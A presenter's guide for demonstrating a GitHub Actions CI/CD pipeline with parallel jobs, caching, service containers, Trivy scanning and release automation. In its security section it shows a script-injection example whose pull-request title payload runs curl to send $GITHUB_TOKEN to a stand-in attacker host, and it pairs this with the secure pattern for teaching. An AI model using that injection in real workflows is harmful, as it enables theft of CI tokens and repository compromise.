# 🎬 SDLC Demo Workflow - Presentation Guide

This guide provides talking points and demonstration steps for presenting the Full-Stack SDLC Demo workflow.

---

## 🎯 **Opening** (2 minutes)

### Key Message
> "I'm going to show you a production-ready CI/CD pipeline that runs in under 4 minutes, demonstrates 15+ best practices, and uses **zero external services**—just GitHub's native features."

### Setup
- Open the GitHub repository in your browser
- Navigate to Actions tab
- Have the workflow file open in VS Code (side-by-side)

---

## 📊 **Part 1: The Big Picture** (3 minutes)

### Show the Workflow Structure

**Visual Aid:** Display the workflow file structure

```
Build (1-2 min)
├─► Unit Tests (3 Node versions in parallel) ← 45 seconds
├─► Integration Tests (PostgreSQL + Redis) ← 1-2 min
├─► Lint & Code Quality ← 30 seconds
└─► Security Scan (Trivy) ← 1-2 min
    └─► Release (main only) ← 30 seconds
```

### Talking Points

1. **"6 jobs, all optimized"**
   - Build runs once
   - 4 jobs run in parallel
   - Release only on main branch

2. **"Multi-version testing"**
   - Unit tests across Node 18, 20, 22
   - Matrix strategy demonstrates compatibility

3. **"Real integration tests"**
   - PostgreSQL 15 + Redis 7 spin up automatically
   - No mocking, no external services needed

---

## 🚀 **Part 2: Trigger the Workflow** (5 minutes)

### Live Demo Steps

1. **Click "Run workflow" button**
   ```
   Actions → SDLC Demo → Run workflow
   ```

2. **While it runs, explain the features you're about to see:**

   **Performance Features:**
   - ✅ Dependency caching (npm, build outputs, ESLint)
   - ✅ Concurrency cancellation (saves 20-30% on active PRs)
   - ✅ Shallow clones (saves 10-15 seconds)
   - ✅ Parallel execution (3-4 min vs 8+ sequential)

   **Security Features:**
   - ✅ SHA-pinned actions (see the commit hashes)
   - ✅ Least privilege permissions
   - ✅ Script injection prevention demo
   - ✅ Trivy vulnerability scanning
   - ✅ Dependabot for action updates

3. **Show the Actions UI**
   - Point out the parallel job execution
   - Show the dependency graph visualization

---

## 🧪 **Part 3: Deep Dive - Testing** (4 minutes)

### Unit Tests (Matrix Strategy)

**Navigate to:** Test Unit job → Expand strategy

**Show:**
```yaml
strategy:
  matrix:
    node-version: ['18.x', '20.x', '22.x']
```

**Talking Point:**
> "See how we're testing on 3 Node versions simultaneously? This catches compatibility issues early. Each variant is a separate runner, so total time is ~45 seconds, not 3 minutes."

**Click into one of the test jobs** → Show:
- Cache hit logs: `npm ci` taking 15s instead of 2 minutes
- Test execution logs
- Coverage upload

### Integration Tests (Service Containers)

**Navigate to:** Integration Tests job

**Show:**
```yaml
services:
  postgres:
    image: postgres:15-alpine
  redis:
    image: redis:7-alpine
```

**Talking Point:**
> "These are **real** databases, not mocks. GitHub spins up PostgreSQL and Redis automatically. Tests connect to localhost:5432 and localhost:6379. After the job finishes, everything is cleaned up. Zero configuration, zero cost."

---

## 🛡️ **Part 4: Security Spotlight** (5 minutes)

### Security Scan Job

**Navigate to:** Security Scan job → Expand steps

**Show:**
1. **Trivy Scan Output**
   - Click "Run Trivy security scan"
   - Show the vulnerability findings (if any)

2. **Action Pinning**
   ```yaml
   - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
   ```
   **Explain:**
   > "See that commit SHA? That's immutable. If someone compromises the `v4` tag, we're protected. This is the gold standard for supply chain security."

3. **Permission Scoping**
   ```yaml
   permissions:
     contents: read  # Default: read-only
   
   jobs:
     release:
       permissions:
         contents: write  # Override only when needed
   ```
   **Explain:**
   > "Least privilege by default. The release job is the ONLY one with write access. If an attacker compromises any other job, they can't push malicious code."

### Script Injection Demo (Optional Advanced Topic)

**Show in workflow file (commented section):**

```yaml
# ❌ VULNERABLE:
- run: echo "${{ github.event.pull_request.title }}"
  # Attacker sets title to: "; curl evil.com?token=$GITHUB_TOKEN"

# ✅ SECURE:
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

**Talking Point:**
> "This is the #1 vulnerability in GitHub Actions. Never interpolate untrusted input directly into shell commands. Always use environment variables."

---

## 📦 **Part 5: Artifacts & Caching** (3 minutes)

### Show Cache Hits

**Navigate to:** Build job → Expand "Setup Node.js"

**Look for:**
```
Cache restored from key: npm-cache-v1-Linux-...
```

**Talking Point:**
> "First run: npm install took 2 minutes. Second run with cache: 15 seconds. That's an 88% time savings. Multiply that by 100 runs per day across 20 developers... massive cost reduction."

### Show Artifacts

**Navigate to:** Workflow summary (bottom of page)

**Show:**
- `build-dist` artifact (retention: 1 day)
- `coverage-node20` artifact (retention: 7 days)
- `integration-test-results` artifact (retention: 7 days)

**Talking Point:**
> "Artifacts have different retention policies based on use case. Build artifacts? 1 day (only needed for this run). Test reports? 7 days (for historical analysis). This saves storage costs."

---

## 🎨 **Part 6: Job Summaries** (2 minutes)

### Navigate to Workflow Summary

**Click:** Workflow run → Summary tab

**Show:**
- Build summary with file sizes
- Test coverage table
- Security scan findings
- Release information (if on main branch)

**Talking Point:**
> "Job summaries are GitHub's modern alternative to parsing logs. Each job writes markdown to `$GITHUB_STEP_SUMMARY`. Non-technical stakeholders can see test results without diving into logs."

**Show in code:**
```yaml
- run: |
    echo "## 🧪 Test Results" >> $GITHUB_STEP_SUMMARY
    echo "| Metric | Value |" >> $GITHUB_STEP_SUMMARY
    echo "|--------|-------|" >> $GITHUB_STEP_SUMMARY
    echo "| Coverage | 85% |" >> $GITHUB_STEP_SUMMARY
```

---

## 🚀 **Part 7: Release Automation** (3 minutes)

### Show Release Job (if ran on main)

**Navigate to:** Release job → Expand steps

**Show:**
1. **Version Generation**
   - Auto-increment based on latest tag
   - Demonstrates semantic versioning

2. **GitHub Release Creation**
   ```bash
   gh release create v1.2.3 \
     --title "Release v1.2.3" \
     --notes "..." \
     dist/*
   ```

3. **Navigate to Releases tab**
   - Show the created release
   - Show attached build artifacts

**Talking Point:**
> "Every push to main triggers a release. Version bumps automatically. Release notes auto-generate from commits. Build artifacts attach automatically. Zero manual work."

---

## 🎓 **Part 8: Key Takeaways** (2 minutes)

### Summary Slide

**What We Demonstrated:**

| Feature | Benefit | Time/Cost Savings |
|---------|---------|-------------------|
| **Parallelization** | Faster feedback | 50% faster (4 min vs 8 min) |
| **Caching** | Reduced build time | 60-70% faster on cache hit |
| **Matrix Testing** | Multi-version coverage | 3 versions in 45 seconds |
| **Service Containers** | Real integration tests | No external services needed |
| **Security Scanning** | Vulnerability detection | Automated, built-in |
| **Concurrency** | Cancel outdated runs | 20-30% billable minutes saved |

### Final Message

> "This workflow uses only GitHub's native features. No external CI/CD tools, no third-party services, no additional costs. Everything runs on GitHub-hosted runners within the free tier for public repos."

---

## 💡 **Bonus: Interactive Q&A Topics** (As needed)

### Common Questions

**Q: "What about Docker builds?"**
A: Add a job with `docker/build-push-action`. GitHub Container Registry is built-in.

**Q: "How do I deploy to AWS/Azure/GCP?"**
A: Use OIDC authentication (no stored credentials). See our `oidc-aws.yml` example.

**Q: "Can I run this on self-hosted runners?"**
A: Yes, change `runs-on: ubuntu-latest` to `runs-on: self-hosted`.

**Q: "How much does this cost?"**
A: Public repos: **FREE**. Private repos: ~$0.06-0.08 per workflow run.

**Q: "How do I handle monorepos?"**
A: Use `paths` filters and dynamic job matrices. See `paths-ignore` in our workflow.

---

## 🎬 **Closing** (1 minute)

### Call to Action

1. **"Try it yourself"**
   - Fork this repository
   - Trigger the workflow with `workflow_dispatch`
   - Experiment with the patterns

2. **"Explore other examples"**
   - 70+ workflow examples in this repo
   - Each demonstrates a specific pattern

3. **"Share what you learned"**
   - Star the repo
   - Show your team
   - Adapt to your stack

---

## 📊 **Demo Metrics** (Reference)

| Metric | Target | Typical Result |
|--------|--------|----------------|
| **Total Workflow Time** | < 5 min | 3-4 min |
| **Build Time** | < 2 min | 1-2 min |
| **Unit Tests (per version)** | < 1 min | 30-45s |
| **Integration Tests** | < 2 min | 1-2 min |
| **Lint** | < 1 min | 15-30s |
| **Security Scan** | < 2 min | 1-2 min |
| **Billable Minutes** | < 12 min | 8-10 min |

---

## 🛠️ **Troubleshooting** (If things go wrong during demo)

### Issue: Workflow doesn't trigger
- Check branch protection rules
- Verify workflow file is on main/develop
- Check `paths-ignore` filters

### Issue: Tests fail
- Show how to debug with job logs
- Demonstrate re-running failed jobs
- Use this as a teaching moment about CI/CD failure handling

### Issue: Slow performance
- Show cache logs to verify hits/misses
- Explain cold cache vs warm cache
- Demonstrate how concurrency cancels outdated runs

---

**Good luck with your demo!** 🚀

*This presentation typically runs 25-30 minutes with Q&A. Adjust timing based on your audience's technical level.*
